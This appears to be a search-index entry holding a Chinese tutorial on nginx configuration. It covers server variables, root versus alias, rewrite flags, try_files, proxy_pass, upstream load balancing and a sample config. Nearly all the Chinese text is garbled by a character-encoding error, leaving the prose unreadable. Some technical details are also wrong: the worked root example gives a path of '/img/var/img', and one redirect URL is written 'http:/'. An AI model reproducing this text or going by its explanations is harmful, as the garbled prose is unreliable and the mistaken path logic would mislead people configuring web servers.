$host ï¼š è¯·æ±‚ä¸»æœºå¤´å­—æ®µï¼Œå¦åˆ™ä¸ºæœåŠ¡å™¨åç§°ã€‚ $http_user_agent ï¼š å®¢æˆ·ç«¯agentä¿¡æ¯ $http_cookie ï¼š å®¢æˆ·ç«¯cookieä¿¡æ¯ $limit_rate ï¼š è¿™ä¸ªå˜é‡å¯ä»¥é™åˆ¶è¿æ¥é€Ÿç‡ã€‚ $request_method ï¼š å®¢æˆ·ç«¯è¯·æ±‚çš„åŠ¨ä½œï¼Œé€šå¸¸ä¸ºGETæˆ–POSTã€‚ $remote_addr ï¼š å®¢æˆ·ç«¯çš„IPåœ°å€ã€‚ $remote_port ï¼š å®¢æˆ·ç«¯çš„ç«¯å£ã€‚ $remote_user ï¼š å·²ç»ç»è¿‡Auth Basic ModuleéªŒè¯çš„ç”¨æˆ·åã€‚ $request_filename ï¼š å½“å‰è¯·æ±‚çš„æ–‡ä»¶è·¯å¾„ï¼Œç”±rootæˆ–aliasæŒ‡ä»¤ä¸URIè¯·æ±‚ç”Ÿæˆã€‚ $scheme ï¼š HTTPæ–¹æ³•ï¼ˆå¦‚httpï¼Œhttpsï¼‰ã€‚ $server_protocol ï¼š è¯·æ±‚ä½¿ç”¨çš„åè®®ï¼Œé€šå¸¸æ˜¯HTTP/1.0æˆ–HTTP/1.1ã€‚ $server_addr ï¼š æœåŠ¡å™¨åœ°å€ï¼Œåœ¨å®Œæˆä¸€æ¬¡ç³»ç»Ÿè°ƒç”¨åå¯ä»¥ç¡®å®šè¿™ä¸ªå€¼ã€‚ $server_name ï¼š æœåŠ¡å™¨åç§°ã€‚ $server_port ï¼š è¯·æ±‚åˆ°è¾¾æœåŠ¡å™¨çš„ç«¯å£å·ã€‚ $request_uri ï¼š åŒ…å«è¯·æ±‚å‚æ•°çš„åŸå§‹URIï¼Œä¸åŒ…å«ä¸»æœºåï¼Œå¦‚ï¼š\"/foo/bar.php?arg=baz\"ã€‚ $uri ï¼š ä¸å¸¦è¯·æ±‚å‚æ•°çš„å½“å‰URIï¼Œ$uriä¸åŒ…å«ä¸»æœºåï¼Œå¦‚\"/foo/bar.html\"ã€‚ $document_uri ï¼š ä¸$uriç›¸åŒã€‚ ä¸€äº›å†…ç½®å…³é”®å­— server_name å½“é…ç½®äº†å¤šä¸ªserveræ—¶ï¼Œä¸”æŸä¸ªserveræœ‰é…ç½®server_nameæ—¶ï¼Œä¼šä¼˜å…ˆæ‰¾server_nameï¼Œå°±ä¼šè®¿é—®ä¸åˆ°æˆ‘æƒ³è¦çš„é‚£ä¸ªserver å¦å¤–ï¼Œaptå®‰è£…çš„nginxé»˜è®¤åœ¨ /etc/nginx/sites-available/default ä¸‹æœ‰ä¸€ä¸ªé»˜è®¤çš„serveré…ç½®ï¼Œè¦é¿å…äºè¿™ä¸ªå†²çªæˆ–è€…ç›´æ¥åˆ é™¤ root ä½¿ç”¨èŒƒå›´ï¼šå¯ä»¥åœ¨ serverã€httpã€location è¡¨ç¤ºè·¯å¾„æ‹¼æ¥ï¼ˆä¸€èˆ¬é…ç½®é™æ€èµ„æºï¼‰ï¼Œæ¯”å¦‚: location /img { root /var/img/ } å®é™…ç»è¿‡ root ä¹‹åçš„è·¯å¾„ä¸º: /img/var/img alias ä½¿ç”¨èŒƒå›´ï¼šåªèƒ½åœ¨ location è¡¨ç¤ºæ–°è·¯å¾„ï¼ˆä»æ ¹è·¯å¾„å¼€å§‹ï¼‰ï¼Œæ¯”å¦‚: location /img { alias /var/img/ } å®é™…ç»è¿‡ alias ä¹‹åçš„è·¯å¾„ä¸º: /var/img æ³¨è§£ å®é™…ä½¿ç”¨æ³¨æ„åˆ†æ¸… root ä¸ alias aliasä½¿ç”¨èŒƒå›´ï¼šåªèƒ½åœ¨ location rootä½¿ç”¨èŒƒå›´ï¼šå¯ä»¥åœ¨ serverã€httpã€location ä¾‹å­: # è®¿é—® localhost/ui/some æ—¶å€™ å®é™…è®¿é—®çš„æ˜¯ /var/www/ui/build/static/some # åªè®¤è‡ªå·±å®šä¹‰çš„åˆ«åï¼Œæ³¨æ„ä¸åŠ  / ä¼šè§¦å‘é‡å®šå‘åˆ°æ­£ç¡®çš„è·¯å¾„ location /ui/ { alias /var/www/ui/build/static/ ; } # è®¿é—® localhost/ui/some æ—¶å€™ å®é™…è®¿é—®çš„æ˜¯ /var/www/ui/build/static/ui/some # ä¼šæŠŠ locationå‰ç¼€åŠ è¿›å» location /ui/ { root /var/www/ui/build/static/ ; } return return çŠ¶æ€ç  å­—ç¬¦ä¸² ç¬¬äºŒä¸ªå­—ç¬¦ä¸²å¯é€‰ï¼Œé»˜è®¤è®¿é—®ä¼šä»¥æ–‡ä»¶çš„å½¢å¼ä¸‹è½½ rewrite å®ç°å¯¹urlçš„é‡å†™ã€é‡å®šå‘ æ ¼å¼: rewrite $æ­£åˆ™ $æ›¿æ¢å†…å®¹ [flagæ ‡è®°] ä¾‹å­: # å°†urlä¸­çš„apiå»é™¤ location /ui { rewrite \"&#94;/api/(.*)$\" /$1 break ; } break åœ¨é‡å†™urlåï¼Œä¸å†é‡æ–°åŒ¹é…è·¯å¾„ last åœ¨é‡å†™è·¯å¾„åï¼Œå°†å¾—åˆ°çš„è·¯å¾„é‡æ–°è¿›è¡Œä¸€æ¬¡è·¯å¾„è·¯å¾„åŒ¹é… try_files æŒ‰ç…§ç»™å®šçš„æ–‡ä»¶åˆ—è¡¨åŒ¹é…æ–‡ä»¶ï¼Œè®¿é—®æ‰¾åˆ°çš„ç¬¬ä¸€ä¸ªæ–‡ä»¶ï¼Œ è‹¥æ–‡ä»¶éƒ½æ²¡æœ‰åŒ¹é…åˆ°ï¼Œé‡æ–°è¯·æ±‚æœ€åä¸€ä¸ªå‚æ•°ç»™çš„ url æ ¼å¼: try_files file1 file2 ...(å¯ä»¥æœ‰å¤šä¸ªfile) url ~ è¡¨ç¤ºå¼€å¯æ­£åˆ™åŒ¹é… proxy_pass åå‘ä»£ç† è¡¨ç¤ºåŠ¨æ€è¯·æ±‚ï¼Œéœ€è¦è¿›è¡Œè¯·æ±‚è½¬å‘ï¼ˆå¦‚è½¬å‘åˆ°tomcatï¼‰ï¼ˆç”¨æ³•ä¸rootåŸºæœ¬ä¸€è‡´ï¼‰ upstream è´Ÿè½½å‡è¡¡é…ç½® åå‘ä»£ç†ä¸­ï¼Œæˆ‘ä»¬é€šè¿‡proxy_passæ¥æŒ‡å®šTomcatçš„åœ°å€ï¼Œ å¾ˆæ˜¾ç„¶æˆ‘ä»¬åªèƒ½æŒ‡å®šä¸€å°Tomcatåœ°å€ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¦‚æœæƒ³æŒ‡å®šå¤šå°æ¥è¾¾åˆ°è´Ÿè½½å‡è¡¡å‘¢ï¼Ÿ ç¬¬ä¸€, é€šè¿‡ upstream æ¥å®šä¹‰ä¸€ç»„Tomcatï¼Œ å¹¶æŒ‡å®šè´Ÿè½½ç­–ç•¥ï¼ˆIPHASHã€åŠ æƒè®ºè°ƒã€æœ€å°‘è¿æ¥ï¼‰, å¥åº·æ£€æŸ¥ç­–ç•¥ï¼ˆNginxå¯ä»¥ç›‘æ§è¿™ä¸€ç»„Tomcatçš„çŠ¶æ€ï¼‰ç­‰ã€‚ ç¬¬äºŒï¼Œå°†proxy_passæ›¿æ¢æˆupstreamæŒ‡å®šçš„å€¼å³å¯ã€‚ è´Ÿè½½å‡è¡¡å¯èƒ½å¸¦æ¥çš„é—®é¢˜ï¼Ÿ è´Ÿè½½å‡è¡¡æ‰€å¸¦æ¥çš„æ˜æ˜¾çš„é—®é¢˜æ˜¯ï¼Œä¸€ä¸ªè¯·æ±‚ï¼Œå¯ä»¥åˆ°A serverï¼Œä¹Ÿå¯ä»¥åˆ°B serverï¼Œ è¿™å®Œå…¨ä¸å—æˆ‘ä»¬çš„æ§åˆ¶ï¼Œå½“ç„¶è¿™ä¹Ÿä¸æ˜¯ä»€ä¹ˆé—®é¢˜ï¼Œ åªæ˜¯æˆ‘ä»¬å¾—æ³¨æ„çš„æ˜¯ï¼š ç”¨æˆ·çŠ¶æ€çš„ä¿å­˜é—®é¢˜ï¼Œå¦‚Sessionä¼šè¯ä¿¡æ¯ï¼Œä¸èƒ½åœ¨ä¿å­˜åˆ°æœåŠ¡å™¨ä¸Š æ–œæ çš„ä½œç”¨ è¢«ä»£ç†çš„è·¯å¾„åŠ ä¸åŠ æ–œæ çš„æƒ…å†µ, å°è¯•è®¿é—® xx.xx.xx.xx/ui/img/img1.png # å®é™…è®¿é—®çš„æ˜¯ http://127.0.0.1:5555/img/img1.png location /ui/ { proxy_pass http://127.0.0.1:5555/ ; } # å®é™…è®¿é—®çš„æ˜¯ http://127.0.0.1:5555/ui/img/img1.png location /ui/ { proxy_pass http://127.0.0.1:5555 ; } å¦‚ä½•é…ç½® é…ç½®è¯¦è§£ é…ç½®è·¯å¾„ä¸€èˆ¬åœ¨ /etc/nginx/nginx.conf , å¦‚æœæ˜¯lnmpç¯å¢ƒå®‰è£…, é…ç½®æ–‡ä»¶å¯èƒ½æ˜¯åœ¨ /usr/local/nginx/conf/nginx.conf å…¶ä»–æƒ…å†µ: é»˜è®¤çš„é…ç½®æ–‡ä»¶ä½ç½®: /usr/local/nginx/conf, /etc/nginx, or /usr/local/etc/nginx. æ‰“å¼€ä¸»é…ç½®æ–‡ä»¶: vim /usr/local/nginx/conf/nginx.conf å†…å®¹ä¸è§£é‡Š: user # è®¾ç½®nginxæœåŠ¡çš„ç³»ç»Ÿä½¿ç”¨ç”¨æˆ· worker_processes # å·¥ä½œè¿›ç¨‹æ•° ä¸€èˆ¬æƒ…å†µä¸CPUæ ¸æ•°ä¿æŒä¸€è‡´ error_log # nginxçš„é”™è¯¯æ—¥å¿— pid # nginxå¯åŠ¨æ—¶çš„pid events { worker_connections # æ¯ä¸ªè¿›ç¨‹å…è®¸æœ€å¤§è¿æ¥æ•° use # nginxä½¿ç”¨çš„å†…æ ¸æ¨¡å‹ } æˆ‘ä»¬ä½¿ç”¨ nginx çš„ http æœåŠ¡ï¼Œåœ¨é…ç½®æ–‡ä»¶ nginx.conf ä¸­çš„ http åŒºåŸŸå†…ï¼Œ é…ç½®æ— æ•°ä¸ª server ï¼Œæ¯ä¸€ä¸ª server å¯¹åº”è¿™ä¸€ä¸ªè™šæ‹Ÿä¸»æœºæˆ–è€…åŸŸå: http { ... ... #åé¢å†è¯¦ç»†ä»‹ç» http é…ç½®é¡¹ç›® server { listen 80 #ç›‘å¬ç«¯å£; server_name localhost #åœ°å€ location / { #è®¿é—®é¦–é¡µè·¯å¾„ root /xxx/xxx/index.html #é»˜è®¤ç›®å½• index index.html index.htm #é»˜è®¤æ–‡ä»¶ } error_page 500 504 /50x.html #å½“å‡ºç°ä»¥ä¸ŠçŠ¶æ€ç æ—¶ä»æ–°å®šä¹‰åˆ°50x.html location = /50x.html { #å½“è®¿é—®50x.htmlæ—¶ root /xxx/xxx/html #50x.html é¡µé¢æ‰€åœ¨ä½ç½® } } server { ... ... } } ä¸€ä¸ª server å¯ä»¥å‡ºç°å¤šä¸ª location ï¼Œæˆ‘ä»¬å¯¹ä¸åŒçš„è®¿é—®è·¯å¾„è¿›è¡Œä¸åŒæƒ…å†µçš„é…ç½®ã€‚ æˆ‘ä»¬å†æ¥çœ‹çœ‹ http çš„é…ç½®ä¸å«ä¹‰: http { sendfile on # é«˜æ•ˆä¼ è¾“æ–‡ä»¶çš„æ¨¡å¼ ä¸€å®šè¦å¼€å¯ keepalive_timeout 65 # å®¢æˆ·ç«¯æœåŠ¡ç«¯è¯·æ±‚è¶…æ—¶æ—¶é—´ log_format main XXX # å®šä¹‰æ—¥å¿—æ ¼å¼ ä»£å·ä¸ºmain access_log /usr/local/access.log main # æ—¥å¿—ä¿å­˜åœ°å€ æ ¼å¼ä»£ç  main } é…ç½®å†…å®¹å…¨éƒ¨ä¸€è§ˆ: # é…ç½®http http { server { # æœåŠ¡å™¨é…ç½®ï¼Œå¯ä»¥æœ‰å¤šä¸ªserver listen 127.0.0.1:8080 # ç›‘å¬çš„ç«¯å£ # å¦‚æœä¸å¡«å†™ç«¯å£ï¼Œåˆ™é‡‡ç”¨æ ‡å‡†ç«¯å£ã€‚ # å¦‚æœä¸å¡«å†™ipåœ°å€ï¼Œåˆ™ç›‘å¬æ‰€æœ‰åœ°å€ã€‚ # å¦‚æœç¼ºå°‘æ•´æ¡listenæŒ‡ä»¤ï¼Œåˆ™æ ‡å‡†ç«¯å£æ˜¯80/tcpï¼Œ # é»˜è®¤ç«¯å£æ˜¯8000/tcpï¼Œç”±è¶…çº§ç”¨æˆ·çš„æƒé™å†³å®šã€‚ # å¤šä¸ªserveré…ç½®äº†ç›¸åŒçš„ipåœ°å€å’Œç«¯å£ï¼ŒNginxä¼šåŒ¹é…server_nameæŒ‡ä»¤ä¸è¯·æ±‚å¤´éƒ¨çš„hostå­—æ®µã€‚ # server_nameæŒ‡ä»¤çš„å‚æ•°å¯ä»¥æ˜¯ç²¾ç¡®çš„æ–‡æœ¬ã€é€šé…ç¬¦æˆ–æ­£åˆ™è¡¨è¾¾å¼ã€‚ server_name example.org www.example.org; # å¦‚æœæœ‰å¤šä¸ªserver_nameåŒ¹é…hostå­—æ®µï¼ŒNginxæ ¹æ®ä»¥ä¸‹è§„åˆ™é€‰æ‹©ç¬¬ä¸€ä¸ªç›¸åŒ¹é…çš„serverå¤„ç†è¯·æ±‚ï¼š # 1ã€ç²¾ç¡®åŒ¹é… # 2ã€ä»¥*å¼€å§‹çš„æœ€é•¿é€šé…ç¬¦ï¼Œå¦‚ *.example.org # 3ã€ä»¥*ç»“å°¾çš„æœ€é•¿é€šé…ç¬¦ï¼Œå¦‚ mail.* # 4ã€ç¬¬ä¸€ä¸ªåŒ¹é…çš„æ­£åˆ™è¡¨è¾¾å¼ï¼ˆæ ¹æ®åœ¨é…ç½®æ–‡ä»¶ä¸­å‡ºç°çš„å…ˆåé¡ºåºï¼‰ # å¦‚æœæ‰¾ä¸åˆ°ä»»ä½•ä¸hostå­—æ®µç›¸åŒ¹é…çš„server_nameï¼ŒNginxä¼šæ ¹æ®è¯·æ±‚ç«¯å£å°†å…¶å‘é€ç»™é»˜è®¤çš„serverã€‚ # é»˜è®¤serverå°±æ˜¯é…ç½®æ–‡ä»¶ä¸­ç¬¬ä¸€ä¸ªå‡ºç°çš„serverï¼Œ # ä¹Ÿå¯ä»¥é€šè¿‡default_serveræŒ‡å®šæŸä¸ªserverä¸ºé»˜è®¤serverï¼Œ # å¦‚listen 0.0.0.0:8080 default_server # æ ¹æ®URLå°†è¯·æ±‚å‘é€ç»™ä¸åŒçš„ä»£ç†/å¤„ç†ä¸åŒçš„æ–‡ä»¶è¯·æ±‚ã€‚ç”±serveræŒ‡ä»¤ä¸­çš„locationæŒ‡ä»¤é…ç½®è§„åˆ™ã€‚ # åŒ¹é…ä»¥/some/path/å¼€å§‹çš„è¯·æ±‚URI location /some/path/ { ... } # ~ ç”¨äºåŒ¹é…åŒºåˆ†å¤§å°å†™çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œ # ~* ç”¨äºåŒ¹é…ä¸åŒºåˆ†å¤§å°å†™çš„æ­£åˆ™è¡¨è¾¾å¼ã€‚ # åŒ¹é…ä»»æ„åŒ…å«.htmlæˆ–.htmçš„URIã€‚ location ~ \\.html? { ... } # Nginxå…ˆåŒ¹é…å‰ç¼€å­—ç¬¦ä¸²ï¼Œç„¶åå†åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼ã€‚æ­£åˆ™è¡¨è¾¾å¼æ‹¥æœ‰è¾ƒé«˜ä¼˜å…ˆçº§ï¼Œ # é™¤éä½¿ç”¨&#94;~ä¿®é¥°ç¬¦ã€‚åœ¨æ‰€æœ‰å‰ç¼€å­—ç¬¦ä¸²ä¸­ï¼ŒNginxä¼šæŒ‘é€‰æœ€ç²¾ç¡®çš„é‚£ä¸ªï¼Œä¹Ÿå°±æ˜¯æœ€é•¿æœ€åŒ¹é…çš„é‚£ä¸ªã€‚ # è¯¦ç»†åŒ¹é…è¿‡ç¨‹å¦‚ä¸‹ï¼š # 1ã€åŒ¹é…æ‰€æœ‰å‰ç¼€å­—ç¬¦ä¸²ï¼› # 2ã€å¦‚æœæœ‰ä¸€ä¸ª = å®šä¹‰çš„ç²¾ç¡®åŒ¹é…å‰ç¼€å­—ç¬¦ä¸²ï¼Œåœæ­¢ç»§ç»­åŒ¹é…ï¼› # 3ã€å¦‚æœ &#94;~ åœ¨æœ€é•¿åŒ¹é…çš„å‰ç¼€å­—ç¬¦ä¸²ä¹‹å‰ï¼Œå°†å¿½ç•¥æ­£åˆ™è¡¨è¾¾å¼ï¼› # 4ã€å­˜å‚¨æœ€é•¿çš„åŒ¹é…å‰ç¼€å­—ç¬¦ä¸²ï¼› # 5ã€åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼ï¼› # 6ã€æ‰¾åˆ°ç¬¬ä¸€ä¸ªç›¸åŒ¹é…çš„æ­£åˆ™è¡¨è¾¾ï¼Œåœæ­¢åŒ¹é…è¿‡ç¨‹ï¼Œå¹¶æ‰§è¡Œè¯¥locationæŒ‡ä»¤ï¼› # 7ã€å¦‚æœæ²¡æœ‰æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ï¼Œåˆ™ä½¿ç”¨ç¬¬4æ­¥å­˜å‚¨çš„æœ€é•¿å‰ç¼€å­—ç¬¦ä¸²ï¼› # = ä¿®é¥°ç¬¦çš„å…¸å‹åº”ç”¨æ˜¯åŒ¹é… /è¯·æ±‚ã€‚ # é’ˆå¯¹é¢‘ç¹è®¿é—®/çš„æƒ…å†µï¼Œå°†locationå‚æ•°è®¾ç½®ä¸º= /å¯ä»¥åŠ é€Ÿå¤„ç†è¿‡ç¨‹ï¼Œ # å› ä¸ºæ•´ä¸ªåŒ¹é…è¿‡ç¨‹åœ¨ç¬¬ä¸€æ¡ä¹‹åå°±ç»“æŸäº†ã€‚ location = / { ... } # locationæŒ‡ä»¤å†…å¯ä»¥é…ç½®å¦‚ä½•å¤„ç†è¯·æ±‚ï¼šå¤„ç†é™æ€æ–‡æ¡£æˆ–å°†è¯·æ±‚è½¬å‘ç»™ä»£ç†æœåŠ¡å™¨ã€‚ # åœ¨ä¸‹é¢çš„ä¾‹å­ä¸­ï¼ŒåŒ¹é…ç¬¬ä¸€ä¸ªlocationçš„è¯·æ±‚å¯ä»¥è®¿é—®/dataç›®å½•çš„æ–‡ä»¶ï¼Œ # åŒ¹é…ç¬¬äºŒä¸ªlocationçš„è¯·æ±‚å°†è¢«è½¬å‘åˆ°www.example.comæœåŠ¡å™¨ã€‚ location /images/ { # rootæŒ‡ä»¤æŒ‡å®šäº†é™æ€æ–‡ä»¶çš„æ–‡ä»¶ç³»ç»Ÿè·¯å¾„ï¼Œå°†ä¸è¯·æ±‚URIä¸€èµ·æ„æˆé™æ€æ–‡ä»¶çš„å®Œå…¨è·¯å¾„ root /data; } location / { # proxy_passæŒ‡ä»¤å°†è¯·æ±‚è½¬å‘åˆ°ä»£ç†æœåŠ¡å™¨ï¼Œå¹¶å°†ä»£ç†æœåŠ¡å™¨çš„å“åº”è¿”å›ç»™å®¢æˆ·ç«¯ã€‚ proxy_pass http://www.example.com; } # sub_filteræŒ‡ä»¤æ”¯æŒé‡å†™æˆ–ä¿®æ”¹HTTPè¯·æ±‚çš„å“åº”å†…å®¹ï¼Œå¦‚æ›¿æ¢æŸä¸ªå­—ç¬¦ä¸²ã€‚è¯¥æŒ‡ä»¤æ”¯æŒå˜é‡å’Œé“¾å¼æ›¿æ¢ã€‚ # å°†æŒ‡å‘æœåŠ¡å™¨çš„é“¾æ¥æ”¹ä¸ºæŒ‡å‘ä»£ç†æœåŠ¡å™¨çš„é“¾æ¥ï¼š location / { sub_filter /blog/ /blog-staging/; sub_filter_once off; } # å°†httpè¯·æ±‚æ”¹ä¸ºhttpsè¯·æ±‚ï¼Œå¹¶å°†è¯·æ±‚å¤´éƒ¨çš„æœ¬åœ°ä¸»æœºåœ°å€æ”¹ä¸ºä¸»æœºåã€‚ # sub_filter_onceæŒ‡ä»¤ç”¨äºå‘Šè¯‰Nginxæ˜¯å¦è¿ç»­æ‰§è¡Œlocationä¸­çš„sub_filteræŒ‡ä»¤ã€‚ # æ³¨æ„ï¼šè¢«sub_filteræŒ‡ä»¤ä¿®æ”¹åçš„å†…å®¹å°†ä¸ä¼šå†è¢«å…¶ä»–sub_filteræŒ‡ä»¤ä¿®æ”¹ã€‚ location / { sub_filter 'href=\"http://127.0.0.1:8080/' 'href=\"https://$host/'; sub_filter 'img src=\"http://127.0.0.1:8080/' 'img src=\"https://$host/'; sub_filter_once on; } # error_pageæŒ‡ä»¤ç”¨äºè¿”å›ä¸€ä¸ªè‡ªå®šä¹‰é”™è¯¯é¡µé¢å’Œä¸€ä¸ªé”™è¯¯ä»£ç ã€ # ä¿®æ”¹å“åº”ä¸­çš„é”™è¯¯ä»£ç æˆ–é‡å®šå‘åˆ°ä¸åŒçš„URIã€‚ # å½“Nginxæœªèƒ½æ‰¾åˆ°è¯·æ±‚çš„é¡µé¢æ—¶ï¼Œä¸ä¼šè¿”å›404ï¼Œè€Œä¼šè¿”å›303å’Œä¸€ä¸ªé‡å®šå‘åˆ°æ–°é¡µé¢æŒ‡ä»¤ã€‚ # è¿™é€šå¸¸ç”¨äºå¤„ç†å®¢æˆ·ç«¯è®¿é—®æ—§åœ°å€çš„æƒ…å†µã€‚ location /old/path.html { error_page 404 =301 http:/example.com/new/path.html; } # æœ‰äº›ç½‘ç«™åœ¨å¤„ç†é”™è¯¯æˆ–é‡å®šå‘æ—¶ï¼Œä¼šè¦æ±‚ç«‹å³è¿”å›ä¸€ä¸ªçŠ¶æ€ç ã€‚æœ€ç®€å•çš„æ–¹å¼å°±æ˜¯ä½¿ç”¨returnæŒ‡ä»¤ location /wrong/url { return 404; } # returnæŒ‡ä»¤çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªçŠ¶æ€ç ã€‚ # ç¬¬äºŒä¸ªæ˜¯å¯é€‰å‚æ•°ï¼Œå¯ä»¥æ˜¯é‡å®šå‘çš„URLï¼ˆå½“çŠ¶æ€ç æ˜¯301ã€302ã€303å’Œ307æ—¶ï¼‰ï¼Œ # ä¹Ÿå¯ä»¥æ˜¯è¿”å›çš„æ–‡æœ¬ä¿¡æ¯ã€‚ location /permanently/moved/url { return 301 http://www.example.com/moved/here; } # å¤„ç†è¯·æ±‚è¿‡ç¨‹ä¸­ï¼Œå¯ä»¥é€šè¿‡rewriteæŒ‡ä»¤é‡å¤ä¿®æ”¹è¯·æ±‚çš„URIã€‚ # rewriteæŒ‡ä»¤åŒ…å«2ä¸ªå¿…å¡«å‚æ•°å’Œ1ä¸ªå¯é€‰å‚æ•°ã€‚ # ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¯·æ±‚URIå¿…é¡»åŒ¹é…çš„æ­£åˆ™è¡¨è¾¾å¼ã€‚ç¬¬äºŒä¸ªå‚æ•°æ˜¯è¦æ›¿æ¢çš„ç›®æ ‡URIã€‚ # ç¬¬ä¸‰ä¸ªä¸ºå¯é€‰å‚æ•°ï¼Œå¯ä»¥æ˜¯ä¸€ä¸ªæ˜¯å¦ç»§ç»­æ‰§è¡Œåç»­rewriteæŒ‡ä»¤çš„æ ‡è®°ï¼Œ # ä¹Ÿå¯ä»¥å‘é€ä¸€ä¸ªé‡å®šå‘æŒ‡ä»¤(çŠ¶æ€ç æ˜¯301æˆ–302)ã€‚ location /users/ { rewrite &#94;/users/(.*)$ /show?user=$1 break; } } # locationå’Œserverä¸­éƒ½å¯ä»¥åŒ…å«å¤šä¸ªrewriteæŒ‡ä»¤ã€‚ # Nginxä»ä¸Šåˆ°ä¸‹ä¾æ¬¡ç£æ€§rewriteæŒ‡ä»¤ï¼Œæ¯æ¬¡è¿›å…¥serveræŒ‡ä»¤å—æ—¶ï¼ŒrewriteæŒ‡ä»¤éƒ½ä¼šè¢«æ‰§è¡Œä¸€æ¬¡ã€‚ # Nginxæ‰§è¡Œå®Œä¸€ç³»åˆ—rewriteæŒ‡ä»¤åï¼Œæ ¹æ®æœ€æ–°çš„URIæ¥é€‰æ‹©locationæŒ‡ä»¤ã€‚ # å¦‚æœlocationä¸­ä¹ŸåŒ…å«rewriteæŒ‡ä»¤ï¼Œå®ƒä»¬ä¹Ÿå°†è¢«ä¾æ¬¡æ‰§è¡Œï¼Œæ‰§è¡Œå®Œæ¯•åå°†é‡æ–°é€‰æ‹©locationã€‚ server { ... rewrite &#94;(/download/.*)/media/(.*)\\..*$ $1/mp3/$2.mp3 last; rewrite &#94;(/download/.*)/audio/(.*)\\..*$ $1/mp3/$2.ra last; return 403; ... } # è¿™ä¸ªä¾‹å­ç”¨äºåŒºåˆ†ä¸¤å¥—ä¸åŒçš„URIã€‚ # ç±»ä¼¼äº/download/some/media/fileçš„URIå°†è¢«æ”¹å†™ä¸º/download/some/mp3/file.mp3ã€‚ # ç”±äºæœ€åçš„æ ‡è¯†lastï¼ŒNginxå°†å¿½ç•¥éšåçš„ä¸¤æ¡æŒ‡ä»¤ï¼Œç„¶åä»¥æ–°çš„URIç»§ç»­å¤„ç†è¯·æ±‚ã€‚ # åŒæ ·åœ°ï¼Œç±»ä¼¼äº/download/some/audio/fileçš„URIå°†è¢«æ”¹å†™ä¸º/download/some/mp3/file.raã€‚ # å¦‚æœè¯·æ±‚URIéƒ½ä¸åŒ¹é…ä¸Šè¿°ä¸¤æ¡rewriteæŒ‡ä»¤ï¼ŒNginxå°†è¿”å›403é”™è¯¯ä»£ç ã€‚ # rewriteæŒ‡ä»¤å¯ä»¥åŒ…å«ä»¥ä¸‹ä¸¤ç§å‚æ•°ï¼Œç”¨äºä¸­æ–­å¤„ç†è¿‡ç¨‹ï¼š # last - åœæ­¢æ‰§è¡Œå½“å‰serveræˆ–locationä¸­çš„rewriteæŒ‡ä»¤ï¼Œå¹¶ä»¥æ–°çš„URIæŸ¥æ‰¾æ–°çš„locationï¼› # break - åœæ­¢æ‰§è¡Œå½“å‰ä¸Šä¸‹æ–‡ç¯å¢ƒå†…çš„rewriteæŒ‡ä»¤ï¼Œå¹¶ä¸ä»¥æ–°çš„URIæŸ¥æ‰¾æ–°çš„locationï¼› # ä»¥ä¸‹ä¾‹å­ä¸­ï¼Œå½“è®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶æ—¶ï¼ŒNginxä¼šå°†è¯·æ±‚é‡å®šå‘åˆ°http://backendã€‚ # ç”±äºerror_pageæŒ‡ä»¤æœªæŒ‡å®šé‡å®šå‘ä»£ç ï¼Œè¯¥ä»£ç å°†ç”±é‡å®šå‘åçš„http://backendè¿”å›ã€‚ # å½“è¯·æ±‚æ–‡ä»¶æœªæ‰¾åˆ°æ—¶ï¼Œerror_pageæŒ‡ä»¤å°†å‘èµ·ä¸€ä¸ªå†…éƒ¨é‡å®šå‘ã€‚ # $urlå˜é‡æŒæœ‰å½“å‰è¯·æ±‚çš„URIï¼Œå¹¶è¢«ä¼ é€’ç»™é‡å®šå‘ã€‚ # å‡è®¾è¯·æ±‚çš„/images/some/fileæ–‡ä»¶æœªæ‰¾åˆ°ï¼Œå°†è¢«é‡å®šå‘åˆ°/fetch/images/some/fileï¼Œ # åŒæ—¶æœç´¢æ–°çš„locationã€‚æœ€ç»ˆï¼Œè¯·æ±‚å°†è¢«ç¬¬äºŒä¸ªlocationå¤„ç†ï¼Œå¹¶è¢«ä»£ç†åˆ°http://backendã€‚ # open_file_cache_errorsæŒ‡ä»¤å¯ç”¨äºæœªæ‰¾åˆ°è¯·æ±‚æ–‡ä»¶æ—¶ï¼Œç¦æ­¢äº§ç”Ÿé”™è¯¯æ¶ˆæ¯ã€‚ # åœ¨ä¸‹ä¾‹ä¸­å¯ä»¥å¿½ç•¥ï¼Œå› ä¸ºé”™è¯¯å·²è¢«æ­£ç¡®å¤„ç†ã€‚ server { ... location /images/ { # Set the root directory to search for the file root /data/www; # Disable logging of errors related to file existence open_file_cache_errors off; # Make an internal redirect if the file is not found error_page 404 = /fetch$uri; } location /fetch/ { proxy_pass http://backend/; } } } æœ¬åœ°å®é™…é…ç½®å°è¯• é…ç½®å‰ç«¯: location /static { alias /var/www/ui/build/static ; # é™æ€èµ„æºæ˜ å°„ } location /ui/ { alias /var/www/ui/build/ ; # å‰ç«¯uièµ„æº try_files $uri $uri/ index.html } location / { rewrite / /ui/ ; # æ‰€æœ‰æ²¡åŒ¹é…åˆ°çš„è¯·æ±‚éƒ½äº¤ç»™ /ui/å¤„ç† }","tags":"å®¹å™¨ä¸é›†ç¾¤","url":"/yq-doc-source-docs-Container-and-cluster-nginx-Configuration.html","loc":"/yq-doc-source-docs-Container-and-cluster-nginx-Configuration.html"},{"title":"nginxæ¦‚å¿µè¯¦è§£","text":"Nginxè”åˆåˆ›å§‹äººå®‰å¾·é²Â·é˜¿åˆ—å…‹è°¢å¤«ï¼ˆAndrew Alexeevï¼‰æ›¾è¯´ï¼š Nginxæ˜¯ä¸ºå¯¹Apacheæ€§èƒ½ä¸æ»¡æ„çš„äººè€Œæ„å»ºçš„ã€‚éšç€Internetéœ€æ±‚çš„å˜åŒ–ï¼ŒWebæœåŠ¡å™¨çš„å·¥ä½œä¹Ÿåœ¨å˜åŒ–ã€‚ Nginxçš„æ„å»ºæ¯”ä»¥å¾€ä»»ä½•æ—¶å€™éƒ½æ›´æœ‰æ•ˆç‡ï¼Œæ›´å¯æ‰©å±•ï¼Œæ›´å®‰å…¨ï¼Œæ›´å¼ºå¤§ã€‚ 